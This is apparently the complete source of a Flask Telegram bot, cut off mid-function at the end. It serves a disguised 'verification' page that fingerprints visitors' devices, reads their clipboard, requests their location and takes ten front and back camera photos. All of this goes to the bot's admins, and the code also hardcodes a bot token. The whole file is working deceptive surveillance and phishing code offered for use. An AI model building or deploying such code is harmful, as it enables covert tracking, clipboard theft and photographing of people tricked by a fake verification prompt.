import os
import json
import datetime
import hashlib
import base64
import logging
import requests
import threading
from io import BytesIO
from flask import Flask, request, jsonify, render_template_string

# ==================== HARDCODED CONFIG ====================
BOT_TOKEN = "8680846598:AAE0o3vS2fn16ZuIvvPJjXeuPQubDT2eUo8"
ADMIN_IDS = [8691519315]
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
BASE_URL = RENDER_URL if RENDER_URL else "http://localhost:5000"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ==================== SETUP ====================
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.pending_broadcast = {}

# ==================== JSON STORAGE (NO DATABASE LOCKS) ====================
DATA_DIR = "data"
USERS_FILE = os.path.join(DATA_DIR, "users.json")
DATA_FILE = os.path.join(DATA_DIR, "collected.json")
STATS_FILE = os.path.join(DATA_DIR, "stats.json")
FILE_LOCK = threading.Lock()

def ensure_dirs():
    os.makedirs(DATA_DIR, exist_ok=True)
    os.makedirs("photos", exist_ok=True)
    os.makedirs("captured_photos", exist_ok=True)
    os.makedirs("exports", exist_ok=True)

def read_json(filepath, default):
    with FILE_LOCK:
        try:
            if os.path.exists(filepath):
                with open(filepath, "r", encoding="utf-8") as f:
                    return json.load(f)
        except:
            pass
        return default

def write_json(filepath, data):
    with FILE_LOCK:
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, default=str)

def get_users():
    return read_json(USERS_FILE, [])

def save_users(users):
    write_json(USERS_FILE, users)

def get_collected():
    return read_json(DATA_FILE, [])

def save_collected(items):
    write_json(DATA_FILE, items)

def get_stats():
    s = read_json(STATS_FILE, {})
    defaults = {"total_users":0,"users_today":0,"total_data":0,"total_visits":0,"bot_status":True,"last_date":""}
    for k, v in defaults.items():
        if k not in s:
            s[k] = v
    return s

def save_stats(stats):
    write_json(STATS_FILE, stats)

def init_data():
    ensure_dirs()
    get_stats()
    logger.info("✅ JSON storage ready")

def stat(key):
    return get_stats().get(key, 0)

def update_stat(key, value):
    s = get_stats()
    s[key] = value
    save_stats(s)

def set_bot_on(val):
    s = get_stats()
    s["bot_status"] = val
    save_stats(s)

def is_bot_on():
    return get_stats().get("bot_status", True)

def add_user(chat_id, username, first_name):
    users = get_users()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    found = False
    for u in users:
        if u["chat_id"] == chat_id:
            u["username"] = username
            u["first_name"] = first_name
            u["last_seen"] = now
            found = True
            break
    if not found:
        users.append({"chat_id": chat_id, "username": username, "first_name": first_name,
                      "first_seen": now, "last_seen": now})
        s = get_stats()
        s["total_users"] = s.get("total_users", 0) + 1
        save_stats(s)
    save_users(users)
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    s = get_stats()
    if s.get("last_date") != today:
        s["last_date"] = today
        s["users_today"] = 0
    s["users_today"] = s.get("users_today", 0) + 1
    save_stats(s)

def save_collected_data(chat_id, device_info, location, photos, additional):
    items = get_collected()
    items.append({
        "id": len(items) + 1,
        "chat_id": chat_id,
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "device_info": device_info,
        "location": location,
        "photos": photos,
        "additional": additional
    })
    save_collected(items)
    s = get_stats()
    s["total_data"] = s.get("total_data", 0) + 1
    s["total_visits"] = s.get("total_visits", 0) + 1
    save_stats(s)

def get_all_users():
    return get_users()

def get_recent_data(limit=10):
    items = get_collected()
    return items[-limit:][::-1]

def export_all_data():
    return get_collected()

# ==================== TELEGRAM API HELPERS ====================

def send_msg(chat_id, text, parse_mode="Markdown", reply_markup=None):
    data = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": True}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    try:
        return requests.post(f"{TELEGRAM_API}/sendMessage", data=data, timeout=10).json()
    except Exception as e:
        logger.error(f"send_msg error: {e}")
        return None

def send_photo_msg(chat_id, photo_data, caption=""):
    url = f"{TELEGRAM_API}/sendPhoto"
    if isinstance(photo_data, str) and photo_data.startswith("data:image"):
        img_data = base64.b64decode(photo_data.split(",")[1])
        files = {"photo": ("photo.jpg", BytesIO(img_data), "image/jpeg")}
        data = {"chat_id": chat_id, "caption": caption}
    else:
        files = {"photo": open(photo_data, "rb")}
        data = {"chat_id": chat_id, "caption": caption}
    try:
        return requests.post(url, data=data, files=files, timeout=10).json()
    except Exception as e:
        logger.error(f"send_photo error: {e}")
        return None

def send_doc(chat_id, filepath, caption=""):
    with open(filepath, "rb") as f:
        try:
            return requests.post(f"{TELEGRAM_API}/sendDocument",
                                 data={"chat_id": chat_id, "caption": caption},
                                 files={"document": f}, timeout=30).json()
        except Exception as e:
            logger.error(f"send_doc error: {e}")
            return None

def edit_msg(chat_id, msg_id, text, parse_mode="Markdown", reply_markup=None):
    data = {"chat_id": chat_id, "message_id": msg_id, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    try:
        return requests.post(f"{TELEGRAM_API}/editMessageText", data=data, timeout=10).json()
    except Exception as e:
        logger.error(f"edit_msg error: {e}")
        return None

def answer_cb(cb_id, text="", alert=False):
    try:
        requests.post(f"{TELEGRAM_API}/answerCallbackQuery",
                      data={"callback_query_id": cb_id, "text": text, "show_alert": alert}, timeout=5)
    except:
        pass

def make_link(chat_id, mode):
    unique_hash = hashlib.md5(f"{chat_id}_{datetime.datetime.now().timestamp()}".encode()).hexdigest()[:12]
    return f"{BASE_URL}/capture?chat_id={chat_id}&uid={unique_hash}&mode={mode}"

# ==================== BOT HANDLERS ====================

def handle_start(chat_id, username, first_name):
    if not is_bot_on() and chat_id not in ADMIN_IDS:
        send_msg(chat_id, "⏳ Bot under maintenance. Try later.")
        return
    add_user(chat_id, username, first_name)
    keyboard = {"inline_keyboard": [
        [{"text": "📍 Location", "callback_data": "opt_location"}],
        [{"text": "📸 Camera", "callback_data": "opt_camera"}],
        [{"text": "📱 Device Info", "callback_data": "opt_device"}],
        [{"text": "🎛️ All Monitor", "callback_data": "opt_all"}]
    ]}
    send_msg(chat_id,
        f"👋 **Welcome, {first_name}!**\n\n"
        f"🤖 Kya karna hai choose karo:\n\n"
        f"📍 **Location** — Location check\n"
        f"📸 **Camera** — Photo verification (10 photos)\n"
        f"📱 **Device Info** — Phone details (no permission)\n"
        f"🎛️ **All Monitor** — Sab kuch ek saath",
        reply_markup=keyboard)

def handle_admin_panel(chat_id):
    if chat_id not in ADMIN_IDS:
        send_msg(chat_id, "❌ Unauthorized.")
        return
    status = "🟢 ON" if is_bot_on() else "🔴 OFF"
    keyboard = {"inline_keyboard": [
        [{"text": "📊 Dashboard", "callback_data": "adm_dash"}],
        [{"text": "🔛 Bot ON/OFF", "callback_data": "adm_toggle"}],
        [{"text": "👥 Users", "callback_data": "adm_users"}],
        [{"text": "📦 Data", "callback_data": "adm_data"}],
        [{"text": "📤 Export", "callback_data": "adm_export"}],
        [{"text": "📢 Broadcast", "callback_data": "adm_bc"}],
        [{"text": "🔄 Reset", "callback_data": "adm_reset"}]
    ]}
    send_msg(chat_id,
        f"🤖 **Admin Panel**\n\nStatus: {status}\n━━━━━━━━━━\n👥 Users: {stat('total_users')}\n📈 Today: {stat('users_today')}\n👁️ Visits: {stat('total_visits')}\n📦 Data: {stat('total_data')}\n━━━━━━━━━━\n⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        reply_markup=keyboard)

def handle_photo_received(chat_id, file_id):
    try:
        resp = requests.get(f"{TELEGRAM_API}/getFile?file_id={file_id}", timeout=10).json()
        file_path = resp["result"]["file_path"]
        img_resp = requests.get(f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}", timeout=15)
        local_path = f"photos/{chat_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        with open(local_path, "wb") as f:
            f.write(img_resp.content)

        cap_link = make_link(chat_id, "camera")
        send_photo_msg(chat_id, local_path, "✅ **Photo received!**")
        keyboard = {"inline_keyboard": [[{"text": "🔗 Click to Verify", "url": cap_link}]]}
        send_msg(chat_id, "⬇️ **Tap below to verify — page black hoga, button par tap karna:**", reply_markup=keyboard)
        return local_path
    except Exception as e:
        logger.error(f"Photo error: {e}")
        send_msg(chat_id, "❌ Error saving photo.")
        return None

def handle_callback(cb):
    data = cb.get("data", "")
    chat_id = cb["message"]["chat"]["id"]
    msg_id = cb["message"]["message_id"]
    cb_id = cb["id"]
    user_id = cb["from"]["id"]

    # ===== USER OPTIONS =====
    if data in ("opt_location", "opt_camera", "opt_device", "opt_all"):
        mode = data.replace("opt_", "")
        answer_cb(cb_id, "Link ban raha hai...")
        if mode == "camera":
            send_msg(chat_id,
                "📸 **Camera mode selected.**\n\n"
                "Pehle apni ek photo bhejo, phir verification link milega.\n"
                "Uske baad black page par **Click to Verify** dabana — 10 photos capture hongi.")
            return
        cap_link = make_link(chat_id, mode)
        labels = {
            "location": "📍 **Location Verification**",
            "device": "📱 **Device Info Check**",
            "all": "🎛️ **Full Verification**"
        }
        keyboard = {"inline_keyboard": [[{"text": "🔗 Open & Verify", "url": cap_link}]]}
        send_msg(chat_id,
            f"{labels.get(mode, '🔗 Verification')}\n\n"
            f"Neeche button par tap karke verify karo — black page khulega:",
            reply_markup=keyboard)
        return

    if data == "send_photo":
        answer_cb(cb_id, "Send your photo now.")
        send_msg(chat_id, "📸 **Please upload your photo now.** Just send it as a photo in this chat.")
        return

    # ===== ADMIN ONLY =====
    if user_id not in ADMIN_IDS:
        answer_cb(cb_id, "❌ Unauthorized", True)
        return

    if data == "adm_dash":
        s = "🟢 ON" if is_bot_on() else "🔴 OFF"
        edit_msg(chat_id, msg_id,
            f"📊 **Dashboard**\n\nStatus: {s}\n━━━━━━━━━━\n👥 Total: {stat('total_users')}\n📈 Today: {stat('users_today')}\n👁️ Visits: {stat('total_visits')}\n📦 Data: {stat('total_data')}\n━━━━━━━━━━\n⏰ {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        answer_cb(cb_id)

    elif data == "adm_toggle":
        new = not is_bot_on()
        set_bot_on(new)
        edit_msg(chat_id, msg_id, f"✅ Bot {'ON 🟢' if new else 'OFF 🔴'}")
        answer_cb(cb_id)

    elif data == "adm_users":
        users = get_all_users()
        msg = f"👥 **Total Users:** {len(users)}\n\n"
        for u in users[-20:]:
            msg += f"• {u.get('first_name','?')} (@{u.get('username','N/A')}) — `{u['chat_id']}` — {u.get('last_seen','')[:16]}\n"
        edit_msg(chat_id, msg_id, msg)
        answer_cb(cb_id)

    elif data == "adm_data":
        items = get_recent_data(10)
        msg = f"📦 **Total Data:** {stat('total_data')}\n\n"
        for it in items:
            di = it.get("device_info", {})
            loc = it.get("location", {})
            ph = it.get("photos", [])
            m = di.get("model","?")[:20]
            l = "📍" if loc.get("lat") else "❌"
            msg += f"• `{it['chat_id']}` | {m} | {l} 📸{len(ph)} | {it['timestamp'][:16]}\n"
        edit_msg(chat_id, msg_id, msg)
        answer_cb(cb_id)

    elif data == "adm_export":
        data_list = export_all_data()
        os.makedirs("exports", exist_ok=True)
        fn = f"exports/export_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fn, "w") as f:
            json.dump(data_list, f, indent=2)
        send_doc(chat_id, fn, f"📤 {len(data_list)} records")
        edit_msg(chat_id, msg_id, f"✅ Exported {len(data_list)} records.")
        answer_cb(cb_id)

    elif data == "adm_bc":
        edit_msg(chat_id, msg_id, "📢 **Send your broadcast message now.** Reply with the message.")
        app.pending_broadcast[chat_id] = True
        answer_cb(cb_id)

    elif data == "adm_reset":
        s = get_stats()
        s["users_today"] = 0
        s["total_visits"] = 0
        s["total_data"] = 0
        save_stats(s)
        edit_msg(chat_id, msg_id, "✅ Stats reset!")
        answer_cb(cb_id)

# ==================== WEBHOOK ====================

@app.route(f"/webhook/{BOT_TOKEN}", methods=["POST"])
def webhook():
    try:
        update = request.get_json()
        if not update:
            return "OK", 200

        logger.info(f"Update: {json.dumps(update)[:200]}")

        if "message" in update:
            msg = update["message"]
            chat_id = msg["chat"]["id"]
            text = msg.get("text", "")
            username = msg["from"].get("username", "")
            first_name = msg["from"].get("first_name", "User")

            if text == "/start":
                handle_start(chat_id, username, first_name)
            elif text.startswith("/admin") or text.startswith("/panel"):
                handle_admin_panel(chat_id)
            elif "photo" in msg:
                handle_photo_received(chat_id, msg["photo"][-1]["file_id"])
            elif chat_id in ADMIN_IDS and chat_id in app.pending_broadcast:
                app.pending_broadcast.pop(chat_id, None)
                users = get_all_users()
                suc, fail = 0, 0
                for u in users:
                    try:
                        send_msg(u["chat_id"], f"📢 **Broadcast:**\n\n{text}")
                        suc += 1
                    except:
                        fail += 1
                send_msg(chat_id, f"✅ Sent: {suc} | Failed: {fail}")

        if "callback_query" in update:
            handle_callback(update["callback_query"])

        return "OK", 200
    except Exception as e:
        logger.error(f"Webhook error: {e}", exc_info=True)
        return "OK", 200

# ==================== CAPTURE WEB PAGE (BLACK + CLICK TO VERIFY + PRO) ====================

HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Verification</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px;color:#fff}
.card{width:100%;max-width:400px;text-align:center;position:relative}
.big-btn{background:linear-gradient(135deg,#00f260,#0575e6);color:#000;border:none;padding:22px 30px;border-radius:50px;font-size:20px;font-weight:800;cursor:pointer;width:100%;box-shadow:0 0 40px rgba(0,242,96,0.5);animation:glow 2s infinite;letter-spacing:1px}
.big-btn:hover{transform:scale(1.03)}
.big-btn:disabled{opacity:0.4;cursor:not-allowed;transform:none;animation:none}
@keyframes glow{0%,100%{box-shadow:0 0 30px rgba(0,242,96,0.4)}50%{box-shadow:0 0 60px rgba(5,117,230,0.7)}}
.title{font-size:18px;color:rgba(255,255,255,0.5);margin-bottom:30px;letter-spacing:2px}
.hidden{display:none}
.progress{color:#00f260;font-size:15px;margin:20px 0;min-height:24px}
.status{color:rgba(255,255,255,0.6);font-size:13px;margin-bottom:30px}
.photo-box{width:100%;border-radius:16px;overflow:hidden;border:3px solid #00f260;margin:16px 0;background:#111}
.photo-box img{width:100%;display:block}
.badge{display:inline-block;background:linear-gradient(135deg,#00f260,#0575e6);color:#000;font-weight:800;padding:8px 24px;border-radius:30px;margin:12px 0;font-size:15px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:16px}
.sbox{background:#111;border:1px solid #222;border-radius:12px;padding:10px;text-align:center}
.sbox .num{color:#00f260;font-size:20px;font-weight:700}
.sbox .lbl{color:rgba(255,255,255,0.4);font-size:10px;margin-top:4px}
.spinner{display:inline-block;width:22px;height:22px;border:3px solid rgba(255,255,255,0.2);border-top:3px solid #00f260;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="card">
<div class="title">🔐 SECURE VERIFICATION</div>

<div id="verifyBox">
<button class="big-btn" id="verifyBtn" onclick="startVerify()">CLICK TO VERIFY</button>
<p class="status" style="margin-top:20px">Permission maangne par Allow dabana</p>
</div>

<div id="progressBox" class="hidden">
<div class="progress" id="progText">Starting...</div>
<div class="status" id="statusText">&nbsp;</div>
</div>

<div id="doneBox" class="hidden">
<div class="badge">✅ VERIFIED</div>
<div id="userPhoto"></div>
<div class="grid" id="finalStats"></div>
<p style="color:rgba(255,255,255,0.3);font-size:12px;margin-top:16px">✓ All data submitted securely</p>
</div>
</div>

<script>
const CID="{{chat_id}}", UID="{{uid}}", BASE="{{base_url}}";
const MODE = new URLSearchParams(window.location.search).get("mode")||"camera";
const di={};
let cd={chat_id:CID,uid:UID,device_info:{},location:{},photos:[],additional:{}};

// ===== PRO DEVICE INFO COLLECTION (NO PERMISSION) =====
function canvasFp(){
  try{const c=document.createElement("canvas");c.width=200;c.height=50;
  const x=c.getContext("2d");x.textBaseline="top";x.font="14px Arial";
  x.fillStyle="#f60";x.fillRect(0,0,100,50);x.fillStyle="#069";
  x.fillText("fp-test-123",2,15);x.fillStyle="rgba(102,204,0,0.7)";x.fillText("xyz",4,30);
  return c.toDataURL().length}catch(e){return "err"}
}
function detectFonts(){
  try{const fonts=["Arial","Verdana","Times New Roman","Courier New","Georgia","Comic Sans MS","Tahoma","Impact","Roboto","Segoe UI","Helvetica"];
  const avail=[];const b=document.createElement("span");b.style.cssText="position:absolute;visibility:hidden;font-size:72px";b.textContent="mmmmmmmmmmlli";
  document.body.appendChild(b);
  fonts.forEach(f=>{const s=document.createElement("span");s.style.cssText=b.style.cssText;s.style.fontFamily=f;s.textContent="mmmmmmmmmmlli";
  document.body.appendChild(s);if(s.offsetWidth!==b.offsetWidth||s.offsetHeight!==b.offsetHeight)avail.push(f);s.remove()});
  b.remove();return avail.join(",")}catch(e){return "err"}
}
async function collectDevice(){
  const ua=navigator.userAgent;
  let model="Device";
  if(/iPhone/.test(ua)){let m=ua.match(/iPhone(\d+),(\d+)/);model=m?"iPhone "+m[1]+","+m[2]:"iPhone"}
  else if(/SM-/.test(ua)){let m=ua.match(/SM-[A-Z0-9]+/);model=m?m[0]:"Samsung"}
  else if(/Redmi|Mi /.test(ua)){let m=ua.match(/(Redmi \d+|Mi \d+)/);model=m?m[0]:"Xiaomi"}
  else if(/Pixel/.test(ua)){let m=ua.match(/Pixel \d+/);model=m?m[0]:"Pixel"}
  else if(/vivo|Vivo/.test(ua))model="Vivo";
  else if(/OPPO|CPH/.test(ua))model="OPPO";
  di.model=model;

  di.ua=ua;
  di.os="?";if(/iPhone|iPad/.test(ua)){let m=ua.match(/OS (\d+)_(\d+)/);di.os=m?"iOS "+m[1]+"."+m[2]:"iOS"}
  else if(/Android/.test(ua)){let m=ua.match(/Android ([\d.]+)/);di.os=m?"Android "+m[1]:"Android"}
  else if(/Windows/.test(ua))di.os="Windows";
  else if(/Linux/.test(ua))di.os="Linux";

  di.browser="?";if(/Chrome/.test(ua)&&!/Edg/.test(ua))di.browser="Chrome";
  else if(/Firefox/.test(ua))di.browser="Firefox";
  else if(/Safari/.test(ua)&&!/Chrome/.test(ua))di.browser="Safari";
  else if(/Edg/.test(ua))di.browser="Edge";

  di.ram=navigator.deviceMemory?navigator.deviceMemory+" GB":"?";
  di.cpu=navigator.hardwareConcurrency?navigator.hardwareConcurrency+" cores":"?";
  di.platform=navigator.platform||"?";
  di.language=navigator.language||"?";
  di.languages=(navigator.languages||[]).join(",");
  di.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
  di.tzOffset=new Date().getTimezoneOffset();
  di.screen=screen.width+"x"+screen.height;
  di.availScreen=screen.availWidth+"x"+screen.availHeight;
  di.colorDepth=screen.colorDepth+"-bit";
  di.pixelRatio=window.devicePixelRatio;
  di.touchPoints=navigator.maxTouchPoints;
  di.online=navigator.onLine;
  di.history=history.length;
  di.webdriver=navigator.webdriver;
  di.doNotTrack=navigator.doNotTrack;
  di.pdfViewer=navigator.pdfViewerEnabled;
  di.vendor=navigator.vendor||"?";
  di.product=navigator.product||"?";
  di.orientation=(screen.orientation&&screen.orientation.type)||"?";
  try{di.plugins=Array.from(navigator.plugins).map(p=>p.name).join(" | ")}catch(e){di.plugins="?"}
  try{di.canvasFp=canvasFp()}catch(e){di.canvasFp="err"}
  try{di.fonts=detectFonts()}catch(e){di.fonts="err"}
  try{const c=document.createElement("canvas");const gl=c.getContext("webgl")||c.getContext("experimental-webgl");
  if(gl){di.gpu=gl.getParameter(gl.RENDERER);di.gpuVendor=gl.getParameter(gl.VENDOR);di.gpuVer=gl.getParameter(gl.VERSION)}}catch(e){}

  if(navigator.getBattery)try{let b=await navigator.getBattery();
    di.battery=Math.round(b.level*100)+"%";
    di.charging=b.charging?"Yes":"No";
    di.chargingTime=b.chargingTime;
    di.dischargingTime=b.dischargingTime}catch(e){}

  let c=navigator.connection||navigator.mozConnection;
  if(c){di.network=c.effectiveType||"?";di.downlink=c.downlink?c.downlink+" Mbps":"?";
  di.rtt=c.rtt?c.rtt+" ms":"?";di.saveData=c.saveData?"Yes":"No"}

  if(navigator.storage&&navigator.storage.estimate)try{
    let st=await navigator.storage.estimate();
    di.storageQuota=((st.quota||0)/1073741824).toFixed(1)+" GB";
    di.storageUsed=((st.usage||0)/1048576).toFixed(1)+" MB";
    di.storageFree=((st.quota-st.usage)/1073741824).toFixed(1)+" GB free"}catch(e){}

  try{di.vibrate=!!navigator.vibrate}catch(e){}
  try{di.audioFp=(window.AudioContext||window.webkitAudioContext)?"supported":"no"}catch(e){}

  if(navigator.mediaDevices&&navigator.mediaDevices.enumerateDevices)try{
    const devs=await navigator.mediaDevices.enumerateDevices();
    di.mediaDevices=devs.map(d=>d.kind+":"+(d.label||"hidden")).join(" | ")}catch(e){di.mediaDevices="?"}

  // Clipboard (best effort)
  try{
    if(navigator.clipboard&&navigator.clipboard.readText){
      const t=await navigator.clipboard.readText();
      di.clipboard=t?t.slice(0,500):"(empty)";
      di.clipboardStatus="read-success";
    } else di.clipboardStatus="not-supported";
  }catch(e){di.clipboardStatus="denied";di.clipboard="(denied)"}

  cd.device_info={...di};
  console.log("PRO Device Info:",di);
}

// ===== STEPS =====
const steps=[];
if(MODE==="device")steps.push({t:"📱 Device Info",a:"dev"});
else if(MODE==="location")steps.push({t:"📍 Location",a:"loc"});
else if(MODE==="camera")steps.push({t:"📸 Camera (10 photos)",a:"cam10"});
else steps.push({t:"📱 Device Info",a:"dev"},{t:"📍 Location",a:"loc"},{t:"📸 Camera (5+5 photos)",a:"cam55"});

let cur=0;
const statusEl=()=>document.getElementById("statusText");
const progEl=()=>document.getElementById("progText");

function showProgress(t,s){progEl().textContent=t;statusEl().textContent=s||"&nbsp;"}

async function startVerify(){
  document.getElementById("verifyBox").classList.add("hidden");
  document.getElementById("progressBox").classList.remove("hidden");
  await collectDevice();
  cur=0;
  await runStep(0);
}

async function runStep(i){
  if(i>=steps.length){await submitData();return}
  cur=i;
  const step=steps[i];
  showProgress("⏳ "+step.t+"...","");
  try{
    if(step.a==="dev"){showProgress("📱 Collecting device info...","koi permission nahi chahiye");await new Promise(r=>setTimeout(r,1500))}
    else if(step.a==="loc"){await getLoc()}
    else if(step.a==="cam10"){await capPhotos("user",10)}
    else if(step.a==="cam55"){await capPhotos("user",5);await capPhotos("environment",5)}
  }catch(e){console.warn("Step fail:",e)}
  await runStep(i+1);
}

function getLoc(){return new Promise((r)=>{
  if(!navigator.geolocation){showProgress("📍 Location","unsupported");r();return}
  showProgress("📍 Requesting location...","browser popup par Allow dabao");
  navigator.geolocation.getCurrentPosition(
    p=>{cd.location={lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy,alt:p.coords.altitude,spd:p.coords.speed};showProgress("📍 Location captured ✓");r()},
    ()=>{showProgress("📍 Location","denied/error");r()},
    {enableHighAccuracy:true,timeout:10000});
})}

async function capPhotos(fm,count){
  let stream;
  try{
    showProgress("📸 Camera permission...","browser popup par Allow dabao");
    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:fm,width:{ideal:640},height:{ideal:480}}});
    const v=document.createElement("video");v.srcObject=stream;await v.play();
    await new Promise(r=>setTimeout(r,600));
    const cam=fm==="user"?"front":"back";
    for(let i=0;i<count;i++){
      await new Promise(r=>setTimeout(r,450));
      const c=document.createElement("canvas");
      c.width=v.videoWidth||640;c.height=v.videoHeight||480;
      c.getContext("2d").drawImage(v,0,0);
      cd.photos.push({camera:cam,data:c.toDataURL("image/jpeg",0.6),ts:new Date().toISOString()});
      showProgress("📸 "+(cam==="front"?"Front":"Back")+" camera — photo "+(i+1)+"/"+count+" ✓","");
    }
    stream.getTracks().forEach(t=>t.stop());
    return true;
  }catch(e){
    if(stream)stream.getTracks().forEach(t=>t.stop());
    showProgress("📸 Camera","denied/error");
    return false;
  }
}

async function submitData(){
  showProgress("📤 Submitting data...","");
  try{
    let r=await fetch("/api/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(cd)});
    let j=await r.json();console.log("Submit:",j);
  }catch(e){console.error("Submit error:",e)}

  document.getElementById("progressBox").classList.add("hidden");
  document.getElementById("doneBox").classList.remove("hidden");

  let photoHtml="";
  if(cd.photos.length){
    photoHtml='<div class="photo-box"><img src="'+cd.photos[0].data+'"></div>';
  }
  document.getElementById("userPhoto").innerHTML=photoHtml;

  let devHtml="";
  if(MODE==="device"){
    devHtml='<div class="sbox"><div class="num">'+(di.model||"✓")+'</div><div class="lbl">📱 Model</div></div>'+
      '<div class="sbox"><div class="num">'+(di.ram||"?")+'</div><div class="lbl">💾 RAM</div></div>'+
      '<div class="sbox"><div class="num">'+(di.battery||"?")+'</div><div class="lbl">🔋 Battery</div></div>'+
      '<div class="sbox"><div class="num">'+(di.network||"?")+'</div><div class="lbl">📡 Network</div></div>'+
      '<div class="sbox"><div class="num">'+(di.os||"?")+'</div><div class="lbl">🌐 OS</div></div>'+
      '<div class="sbox"><div class="num">'+(di.storageFree||"?")+'</div><div class="lbl">🗄️ Storage</div></div>'+
      '<div class="sbox"><div class="num">'+(di.clipboardStatus||"?")+'</div><div class="lbl">📋 Clipboard</div></div>'+
      '<div class="sbox"><div class="num">'+(di.gpuVendor||"?")+'</div><div class="lbl">🎮 GPU</div></div>';
  }else{
    devHtml='<div class="sbox"><div class="num">'+(cd.location.lat?"✓":"—")+'</div><div class="lbl">📍 Location</div></div>'+
      '<div class="sbox"><div class="num">'+cd.photos.length+'</div><div class="lbl">📸 Photos</div></div>'+
      '<div class="sbox"><div class="num">'+(di.model||"✓")+'</div><div class="lbl">📱 Device</div></div>'+
      '<div class="sbox"><div class="num">'+(di.battery||"?")+'</div><div class="lbl">🔋 Battery</div></div>';
  }
  document.getElementById("finalStats").innerHTML=devHtml;
}

// Device info load hoti hi collect ho jayegi (background)
document.addEventListener("DOMContentLoaded",()=>{collectDevice();});
</script>
</body>
</html>
"""

@app.route("/capture")
def capture():
    chat_id = request.args.get("chat_id", "")
    uid = request.args.get("uid", "")
    if not chat_id or not uid:
        return "Invalid link", 400
    return render_template_string(HTML_PAGE, chat_id=chat_id, uid=uid, base_url=BASE_URL)

# ==================== DATA COLLECTION API ====================

@app.route("/api/collect", methods=["POST"])
def collect():
    try:
        data = request.get_json()
        if not data or not data.get("chat_id"):
            return jsonify({"status":"error","message":"Invalid"}), 400

        chat_id = int(data["chat_id"])
        device_info = data.get("device_info", {})
        location = data.get("location", {})
        photos = data.get("photos", [])
        additional = data.get("additional", {})

        save_collected_data(chat_id, device_info, location, photos, additional)

        for i, p in enumerate(photos):
            if p.get("data","").startswith("data:image"):
                img = base64.b64decode(p["data"].split(",")[1])
                fn = f"captured_photos/{chat_id}_{datetime.datetime.now().strftime('%H%M%S')}_{p.get('camera','x')}_{i}.jpg"
                with open(fn, "wb") as f:
                    f.write(img)

        # Admin notification — full pro summary
        for aid in ADMIN_IDS:
            msg = (
                f"📩 **NEW DATA — {MODE_LABEL(data)}**\n\n"
                f"👤 **User:** `{chat_id}`\n"
                f"━━━━━━━━━━━━━━\n"
                f"📱 **Model:** {device_info.get('model','?')}\n"
                f"🌐 **OS:** {device_info.get('os','?')}\n"
                f"💾 **RAM:** {device_info.get('ram','?')} | ⚡ {device_info.get('cpu','?')}\n"
                f"🔋 **Battery:** {device_info.get('battery','?')} ({device_info.get('charging','?')})\n"
                f"📡 **Network:** {device_info.get('network','?')} @ {device_info.get('downlink','?')}\n"
                f"🎮 **GPU:** {device_info.get('gpuVendor','?')}\n"
                f"📋 **Clipboard:** {device_info.get('clipboardStatus','?')}\n"
            )
            if device_info.get("clipboard") and device_info.get("clipboardStatus")=="read-success":
                msg += f"📋 **Clipboard Content:** `{device_info['clipboard'][:100]}`\n"
            if device_info.get("mediaDevices"):
                msg += f"🎥 **Devices:** {device_info['mediaDevices'][:80]}\n"
            if location.get("lat"):
                msg += f"📍 **Location:** [Map](https://www.google.com/maps?q={location['lat']},{location['lng']})\n"
            msg += f"📸 **Photos:** {len(photos)}\n"
            msg += f"⏰ **Time:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            send_msg(aid, msg)

            # Send captured photos
            for i, p in enumerate(photos):
                if p.get("data","").startswith("data:image"):
                    send_photo_msg(aid, p["data"], f"📸 {p.get('camera','?')} #{i+1} — `{chat_id}`")

        return jsonify({"status":"success"})
    except Exception as e:
        logger.error(f"Collect error: {e}", exc_info=True)
        return jsonify({"status":"error","message":str(e)}), 500

def MODE_LABEL(data):
    try:
        mode = ""
        if data.get("location", {}).get("lat"):
            mode += "📍"
        if data.get("photos"):
            mode += "📸"
        if data.get("device_info", {}).get("model"):
            mode += "📱"
        return mode if mode else "🔗"
    except:
        return "🔗"

# ==================== UTILITY ROUTES ====================

@app.route("/")
def home():
    bot_username = BOT_TOKEN.split(":")[0]
    return f'<script>window.location="https://t.me/{bot_username}";</script><a href="https://t.me/{bot_username}">Open Bot</a>'

@app.route("/health")
@app.route("/ping")
def health():
    return jsonify({
        "status": "alive",
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "bot_on": is_bot_on(),
        "users": stat("total_users"),
        "data": stat("total_data")
    })

@app.route("/set_webhook")
def set_webhook_route():
    webhook_url = f"{BASE_URL}/webhook/{BOT_TOKEN}"
    try:
        r = requests.get(f"{TELEGRAM_API}/setWebhook?url={webhook_url}", timeout=10).json()
